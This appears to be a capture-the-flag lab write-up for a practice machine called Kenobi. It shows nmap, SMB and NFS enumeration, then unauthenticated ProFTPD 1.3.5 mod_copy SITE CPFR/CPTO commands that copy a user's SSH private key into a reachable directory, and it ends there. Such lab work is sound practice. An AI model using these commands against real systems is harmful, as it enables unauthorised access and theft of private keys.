# Kenobi

First
```
❯ nmap 10.48.190.52
Starting Nmap 7.992 ( https://nmap.org ) at 2026-10-22 16:04 +0600
❯ nmap -T4 10.48.190.52
Starting Nmap 7.992 ( https://nmap.org ) at 2026-10-22 16:04 +0600
Nmap scan report for 10.48.190.52
Host is up (0.046s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs

Nmap done: 1 IP address (1 host up) scanned in 26.77 seconds
❯ nmap -sC -sV -p21,22,80,111,139,44,2049 10.48.190.52
Starting Nmap 7.992 ( https://nmap.org ) at 2026-10-22 16:06 +0600
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.45 seconds
❯ nmap -sC -sV -p21,22,80,111,139,44,2049 10.48.190.52
Starting Nmap 7.992 ( https://nmap.org ) at 2026-10-22 16:06 +0600
Nmap scan report for 10.48.190.52
Host is up (0.13s latency).

PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
22/tcp   open   ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6b:3d:40:12:d0:fc:7f:d0:e4:83:b2:c5:d5:f7:50:9e (RSA)
|   256 e0:ce:2f:d6:71:d6:e7:53:af:bc:5f:11:18:40:d8:01 (ECDSA)
|_  256 b4:a9:e3:b9:94:d0:0f:3c:3d:79:95:32:72:8d:0b:c4 (ED25519)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
44/tcp   closed mpm-flags
80/tcp   open   http        Apache httpd 2.4.41 ((Ubuntu))
|_http-trane-info: ERROR: Script execution failed (use -d to debug)
|_https-redirect: ERROR: Script execution failed (use -d to debug)
|_hnap-info: ERROR: Script execution failed (use -d to debug)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
|_http-server-header: ERROR: Script execution failed (use -d to debug)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open   rpcbind
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
|_rpc-grind: ERROR: Script execution failed (use -d to debug)
139/tcp  open   netbios-ssn Samba smbd 4
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
2049/tcp open   rpcbind
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpc-grind: ERROR: Script execution failed (use -d to debug)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-10-22T10:06:56
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.64 seconds
```

Then
```
❯ smbclient -N -L //10.48.190.52
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      
	IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
❯ smbclient //10.48.190.52/anonymous
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\leon]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 16:49:09 2019
  ..                                  D        0  Sat Aug  9 19:03:22 2025
  log.txt                             N    12237  Wed Sep  4 16:49:09 2019

		9183416 blocks of size 1024. 2916696 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (24.7 KiloBytes/sec) (average 24.7 KiloBytes/sec)
smb: \> exit

~
❯
```

```
❯ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.48.190.52
Starting Nmap 7.992 ( https://nmap.org ) at 2026-10-22 16:13 +0600
Nmap scan report for 10.48.190.52
Host is up (0.10s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 2.50 seconds

~
```

```
❯ nc 10.48.190.52 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.48.190.52]
```
Found `ProFTPD 1.3.5` version, using this search on exploit-db

The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
We know the username is kenobi so we can do this:
```
❯ nc 10.48.190.52 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.48.190.52]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
. 
500 . not understood
/var/tmp/id_rsa
500 /VAR/TMP/ID RSA not understood
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```







